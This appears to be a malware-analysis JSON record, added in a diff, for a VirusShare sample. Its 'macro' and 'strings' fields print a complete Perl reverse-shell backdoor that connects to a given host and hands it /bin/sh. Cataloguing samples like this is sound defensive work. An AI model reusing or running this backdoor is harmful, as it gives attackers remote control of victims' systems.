@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Shell": "May run an executable file or a system command",
+            "exec": "May run an executable file or a system command using Excel 4 Macros",
+            "open": "May open a file"
+        },
+        "macro": "#!/usr/bin/perl\n\n# Backdoor - Perl Connect Back Backdoor\n# Unpublished/Unreleased Source Code\n\nuse Socket;\n\nprint \"Backdoor ! bypassing Firewalls\\n\\n\";\n\nif (!$ARGV[0]) {\n  printf \"Uso: $0 [Host] <Puerto>\\n\";\n  exit(1);\n}\n\nprint \"[*] Espere ...\\n\";\n\n$host = $ARGV[0];\n$port = 80;\n\nif ($ARGV[1]) {\n  $port = $ARGV[1];\n}\n\nprint \"[*] Conectando...\\n\";\n\n$proto = getprotobyname('tcp') || die(\"[-] Protocolo Desconocido\\n\");\n\nsocket(SERVER, PF_INET, SOCK_STREAM, $proto) || die (\"[-] Error Socket\\n\");\n\nmy $target = inet_aton($host);\n\nif (!connect(SERVER, pack \"SnA4x8\", 2, $port, $target)) {\n  die(\"[-] Imposible Conectar\\n\");\n}\n\nprint \"[*] Cargando Shell...\\n\";\n\nif (!fork( )) {\n  open(STDIN,\">&SERVER\");\n  open(STDOUT,\">&SERVER\");\n  open(STDERR,\">&SERVER\");\n\n  exec {'/bin/sh'} '-bash' . \"\\0\" x 4;\n  exit(0);\n}\n\nprint \"[*] Cargada a joder!\\n\\n\";"
+    },
+    "filename": "VirusShare_3b6608c2b86ed31eeb6bb14f51b90093",
+    "filesize": 843,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "3b6608c2b86ed31eeb6bb14f51b90093",
+        "sha1": "6da133b479341d66968be7f2ca52f5107b88d22a",
+        "sha256": "fe4866d274df814a5fbd1ff2d76f7f69e0f99e50a13e30183542b477d94d20c2"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "# Backdoor - Perl Connect Back Backdoor",
+            "# Unpublished/Unreleased Source Code",
+            "use Socket;",
+            "print \"Backdoor ! bypassing Firewalls\\n\\n\";",
+            "if (!$ARGV[0]) {",
+            "  printf \"Uso: $0 [Host] <Puerto>\\n\";",
+            "  exit(1);",
+            "print \"[*] Espere ...\\n\";",
+            "$host = $ARGV[0];",
+            "$port = 80;",
+            "if ($ARGV[1]) {",
+            "  $port = $ARGV[1];",
+            "print \"[*] Conectando...\\n\";",
+            "$proto = getprotobyname('tcp') || die(\"[-] Protocolo Desconocido\\n\");",
+            "socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die (\"[-] Error Socket\\n\");",
+            "my $target = inet_aton($host);",
+            "if (!connect(SERVER, pack \"SnA4x8\", 2, $port, $target)) {",
+            "  die(\"[-] Imposible Conectar\\n\");",
+            "print \"[*] Cargando Shell...\\n\";",
+            "if (!fork( )) {",
+            "  open(STDIN,\">&SERVER\");",
+            "  open(STDOUT,\">&SERVER\");",
+            "  open(STDERR,\">&SERVER\");",
+            "  exec {'/bin/sh'} '-bash' . \"\\0\" x 4;",
+            "  exit(0);",
+            "print \"[*] Cargada a joder!\\n\\n\";"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.274543",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
